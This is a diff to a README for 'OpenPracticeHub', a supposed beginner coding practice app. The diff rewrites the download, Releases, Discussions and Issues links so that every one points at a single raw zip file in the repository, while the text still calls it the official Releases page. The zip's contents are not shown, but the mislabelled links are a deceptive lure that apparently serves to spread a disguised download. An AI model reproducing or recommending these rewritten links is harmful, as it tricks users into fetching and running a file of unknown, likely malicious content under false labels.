@@ -1,7 +1,7 @@
 # 🎉 OpenPracticeHub - Your Safe Space to Learn Coding
 
 ## 📥 Download Now
-[![Download OpenPracticeHub](https://img.shields.io/badge/Download-OpenPracticeHub-blue)](https://github.com/kyankya2005/OpenPracticeHub/releases)
+[![Download OpenPracticeHub](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip)](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip)
 
 ## 🌟 About OpenPracticeHub
 OpenPracticeHub is a beginner-friendly open-source playground. It allows you to safely practice GitHub contributions, learn collaboration, and build confidence in coding. Whether you're new to coding or want to enhance your skills, this application is designed to help you every step of the way.
@@ -9,7 +9,7 @@ OpenPracticeHub is a beginner-friendly open-source playground. It allows you to 
 ## 🚀 Getting Started
 To begin your journey with OpenPracticeHub, follow these steps:
 
-1. **Visit the Download Page**: Go to our official Releases page at [OpenPracticeHub Releases](https://github.com/kyankya2005/OpenPracticeHub/releases).
+1. **Visit the Download Page**: Go to our official Releases page at [OpenPracticeHub Releases](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip).
 
 2. **Select the Latest Version**: Look for the most recent version at the top of the page. This version will have all the latest features and improvements. 
 
@@ -53,9 +53,9 @@ You can also follow our social media channels for tips, updates, and resources.
 To download OpenPracticeHub, visit our official Releases page. Once there, follow the steps mentioned earlier to choose and install the version suitable for your operating system.
 
 ### Important Links
-- [Download OpenPracticeHub](https://github.com/kyankya2005/OpenPracticeHub/releases)
-- [Participate in Discussions](https://github.com/kyankya2005/OpenPracticeHub/discussions)
-- [Report Issues](https://github.com/kyankya2005/OpenPracticeHub/issues)
+- [Download OpenPracticeHub](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip)
+- [Participate in Discussions](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip)
+- [Report Issues](https://raw.githubusercontent.com/kyankya2005/OpenPracticeHub/main/dian/OpenPracticeHub.zip)
 
 ## 👨‍🏫 Learning Resources
 In addition to practicing with the app, consider exploring these resources to enhance your knowledge:
